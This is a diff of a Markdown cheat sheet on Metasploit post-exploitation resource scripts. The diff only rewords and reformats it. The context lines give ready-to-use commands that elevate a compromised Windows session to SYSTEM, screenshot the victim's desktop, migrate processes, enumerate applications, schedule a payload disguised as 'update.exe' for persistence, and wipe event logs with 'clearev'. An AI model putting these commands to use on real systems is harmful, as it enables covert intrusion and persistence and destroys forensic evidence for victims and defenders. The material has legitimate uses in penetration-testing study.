@@ -100,7 +100,7 @@
 <br /><br /><br />
 
 ## RESOURCE SCRIPTS IN POST EXPLOITATION
-<blockquote>Auto-run scripts are great when you need multiple modules to run automatically. Lets assume the first thing(s) we do after a successfully exploitation its to elevate the current session to NT authority/system, take a screenshot of current desktop, migrate to another process and run post exploitation modules. Having all this commands inside a rc script saves us time (automation).</blockquote>
+<blockquote>Auto-run scripts are great when you need multiple modules to run automatically. Lets assume the first thing(s) we do after a successfully exploitation its to elevate the current session to NT authority/system, take a screenshot of current desktop, migrate to another process and run post exploitation modules. Having all this commands inside a rc script saves us time.</blockquote>
 
 - **Resource script to elevate session,take screenshots, migrate and run post-modules::**`[bash prompt]`<br />
 
@@ -113,9 +113,7 @@
         echo 'run post/windows/gather/enum_applications' >> my_resource_file.rc
         echo 'run post/multi/recon/local_exploit_suggester' >> my_resource_file.rc
 
-<br />
-
-`[run]` meterpreter > resource /root/my_resource_file.rc
+     `[run]` meterpreter > resource /root/my_resource_file.rc
 
 <br />
 
@@ -134,9 +132,7 @@
         echo 'run scheduleme -m 10 -c "%temp%\\update.exe"' >> my_resource_file.rc
         clearev
 
-<br />
-
-`[run]` meterpreter > resource /root/my_resource_file.rc
+     `[run]` meterpreter > resource /root/my_resource_file.rc
 
 <br />
 
